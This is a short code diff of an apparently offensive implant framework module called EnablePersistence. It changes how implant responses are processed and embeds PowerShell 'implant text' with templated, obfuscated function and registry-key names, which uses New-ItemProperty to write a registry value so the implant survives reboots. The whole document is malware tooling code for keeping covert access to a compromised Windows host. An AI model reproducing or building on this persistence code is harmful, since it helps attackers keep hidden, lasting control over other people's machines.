@@ -5,8 +5,8 @@ class EnablePersistence:
     args = None
     input = "enable_persistence"
 
-    def process_implant_response(self):
-        print("We're processing downloaded file")
+    def process_implant_response(self, data, args):
+        return data.decode(), None
 
     def implant_text(self):
         var = '''
@@ -20,6 +20,5 @@ function {{ ron.obf_create_persistence }}(){
         New-ItemProperty -Path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String"
     }
     $Script:tr = "Enabled"
-}
-'''
+}'''
         return var
